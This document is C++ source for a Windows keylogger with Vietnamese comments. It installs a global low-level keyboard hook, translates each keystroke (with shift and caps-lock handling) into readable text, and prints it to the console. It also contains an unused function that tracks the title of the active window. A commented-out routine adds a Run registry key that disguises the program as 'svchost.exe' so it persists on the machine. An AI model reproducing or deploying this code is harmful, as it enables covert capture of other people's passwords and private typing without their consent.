// Keylogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <thread>
#include <windows.h>
#include <string.h>
#include <string>
#include <fstream>
#include <map>
#include <iterator>
#include <utility>

std::fstream FILELOG;

typedef std::pair<std::string, std::string> keypair;

std::map<int, keypair> keyS;
std::map<int, std::string> keyO;

void writeLog(std::string str)
{
    std::cout << str;
}


void init()
{
    // key có 2 trạng thái
    keyS[0x30] = { "0",")" };
    keyS[0x31] = { "1","!" };
    keyS[0x32] = { "2","@" };
    keyS[0x33] = { "3","#" };
    keyS[0x34] = { "4","$" };
    keyS[0x35] = { "5","%" };
    keyS[0x36] = { "6","^" };
    keyS[0x37] = { "7","&" };
    keyS[0x38] = { "8","*" };
    keyS[0x39] = { "9","(" };
    keyS[0xBA] = { ";",":" };
    keyS[0xBB] = { "=","+" };
    keyS[0xBC] = { ",","<" };
    keyS[0xBD] = { "-","_" };
    keyS[0xBE] = { ".",">" };
    keyS[0xBF] = { "/","?" };
    keyS[0xC0] = { "`","~" };
    keyS[0xDB] = { "[","{" };
    keyS[0xDC] = { "\\","|" };
    keyS[0xDD] = { "]","}" };
    keyS[0xDE] = { "'","\"" };
    for (int i = 0x41; i <= 0x5A; ++i)
    {
        keyS.insert(std::pair<int, keypair>(i, keypair(std::string(1,static_cast<char>(i+0x20)), std::string(1, static_cast<char>(i)))));
    }

    //----------------------------------------------
    for (int i = 0x60; i <= 0x69; ++i)
    {
        keyO.insert({ i,std::to_string(i - 0x60) });
    }

    for (int i = VK_F1; i <= VK_F24; ++i)
    {
        keyO.insert({ i,"[F" + std::to_string(i - VK_F1 + 1)+"]" });
    }

    keyO[VK_NUMLOCK] = "[NUMLOCK]";
    keyO[VK_SCROLL] = "[SCROLLLOCK]";
    keyO[VK_SHIFT] = "[SHIFT]";
    keyO[VK_CONTROL] = "[CONTROL]";
    keyO[VK_LCONTROL] = "[LEFT CONTROL]";
    keyO[VK_RCONTROL] = "[RIGHT CONTROL]";
    keyO[VK_LSHIFT] = "[LEFT SHIFT]";
    keyO[VK_RSHIFT] = "[RIGHT SHIFT]";
    keyO[VK_LMENU] = "[LEFT ALT]";
    keyO[VK_RMENU] = "[RIGHT ALT]";
    keyO[VK_MENU] = "[ALT]";
    keyO[VK_CANCEL] = "[CANCEL]";
    keyO[VK_APPS] = "[APP]";
    keyO[VK_LWIN] = "[LEFT WINDOWS]";
    keyO[VK_RWIN] = "[RIGHT WINDOWS]";
    keyO[VK_BACK] = "[BACK SPACE]";
    keyO[VK_TAB] = "[TAB]";
    keyO[VK_RETURN] = "[ENTER]\n";
    keyO[VK_PAUSE] = "[PAUSE]";
    keyO[VK_CAPITAL] = "[CAPS LOCK]";
    keyO[VK_ESCAPE] = "[ESC]";
    keyO[VK_SPACE] = "[SPACEBAR]";
    keyO[VK_PRIOR] = "[PAGE UP]";
    keyO[VK_NEXT] = "[PAGE DOWN]";
    keyO[VK_END] = "[END]";
    keyO[VK_HOME] = "[HOME]";
    keyO[VK_LEFT] = "[LEFT ARROW]";
    keyO[VK_UP] = "[UP ARROW]";
    keyO[VK_RIGHT] = "[RIGHT ARROW]";
    keyO[VK_DOWN] = "[DOWN ARROW]";
    keyO[VK_SELECT] = "[SELECT]";
    keyO[VK_PRINT] = "[PRINT]";
    keyO[VK_EXECUTE] = "[EXECUTE]";
    keyO[VK_SNAPSHOT] = "[PRINT SCREEN]";
    keyO[VK_INSERT] = "[INS]";
    keyO[VK_DELETE] = "[DEL]";
    keyO[VK_HELP] = "[HELP]";
    keyO[VK_SLEEP] = "[SLEEP]";
    keyO[VK_MULTIPLY] = "*";
    keyO[VK_ADD] = "+";
    keyO[VK_SEPARATOR] = "Separator";
    keyO[VK_SUBTRACT] = "-";
    keyO[VK_DECIMAL] = ".";
    keyO[VK_DIVIDE] = "/";

}

void windowsTitle()
{
    WCHAR wnd_title[256];
    WCHAR prev_wnd_title[256];
    ZeroMemory(prev_wnd_title, sizeof(prev_wnd_title));
    while (true)
    {
        Sleep(100);
        
        ZeroMemory(wnd_title, sizeof(wnd_title));
        HWND hwnd = GetForegroundWindow(); // get handle of currently active window
        GetWindowText(hwnd, wnd_title, sizeof(wnd_title));
        if (wcscmp(wnd_title, prev_wnd_title) != 0)
        {
            wprintf(L"%s\n", wnd_title);
            wcscpy_s(prev_wnd_title,sizeof(prev_wnd_title), wnd_title);
        }
        
    }
}


/*
void AutoStart()
{
    char Driver[MAX_PATH];
    HKEY hKey;
    std::string ff_path = "svchost.exe";
    strcpy(Driver, ff_path.c_str());
    RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "Dit", 0, REG_SZ, (const unsigned char*)Driver, MAX_PATH);
    RegCloseKey(hKey);
}
*/



LRESULT CALLBACK KeyProc(int Code, WPARAM wParam, LPARAM lParam)
{
    KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
    DWORD vkCode;
    switch (wParam)
    {
    case WM_KEYDOWN:
        vkCode = pKey->vkCode;
        if (GetAsyncKeyState(VK_SHIFT))
        {
            for (std::map<int, keypair>::iterator it = keyS.begin(); it != keyS.end(); it++)
            {
                if (it->first == vkCode)
                {
                    if(GetKeyState(VK_CAPITAL) && it->first >= 0x41 && it->first <=0x5A)
                        writeLog(it->second.first);
                    else 
                        writeLog(it->second.second);
                }
            }          
        }
        else
        {
            for (std::map<int, keypair>::iterator it = keyS.begin(); it != keyS.end(); it++)
            {
                if (it->first == vkCode)
                {
                    if (GetKeyState(VK_CAPITAL) && it->first >= 0x41 && it->first <= 0x5A)
                        writeLog(it->second.second);
                    else
                        writeLog(it->second.first);
                }
            }
        }
        

        for (std::map<int, std::string>::iterator it = keyO.begin(); it != keyO.end(); ++it)
        {
            if (it->first == vkCode)
            {
                writeLog(it->second);
            }
        }

        writeLog("  ->  "+std::to_string(vkCode));
        writeLog("\n");

        break;
    default:
        return CallNextHookEx(NULL, Code, wParam, lParam);
    }
    return 0;
}

void InstallHook()
{
    HHOOK hHook;
    HINSTANCE hModule = GetModuleHandle(NULL);
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyProc, hModule, 0);


}




int main()
{
    //std::thread t1(windowsTitle);
    
    init();
    InstallHook();
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)!=0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

}

